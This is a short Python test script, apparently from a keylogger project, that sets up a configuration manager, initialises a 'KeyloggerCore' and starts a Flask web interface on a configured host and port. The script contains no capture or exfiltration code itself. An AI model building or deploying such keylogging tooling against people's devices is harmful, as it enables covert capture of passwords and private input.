#!/usr/bin/env python3
"""Simple test script to isolate and test the web interface."""

import sys
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

from core.config_manager import ConfigManager
from core.keylogger import KeyloggerCore
from web.app import create_web_app

def test_web_interface():
    """Test the web interface in isolation."""
    try:
        print("Initializing configuration manager...")
        config_manager = ConfigManager('config.json')
        
        print("Initializing keylogger core...")
        keylogger_core = KeyloggerCore('config.json')
        
        print("Creating web app...")
        web_app = create_web_app(keylogger_core, config_manager)
        
        if web_app:
            print("Web app created successfully!")
            print("Starting Flask development server...")
            
            host = config_manager.get('web.host', '127.0.0.1')
            port = config_manager.get('web.port', 5000)
            debug = config_manager.get('web.debug', False)
            
            print(f"Server will run on http://{host}:{port}")
            web_app.run(host=host, port=port, debug=debug, threaded=True, use_reloader=False)
        else:
            print("Failed to create web app!")
            
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    test_web_interface()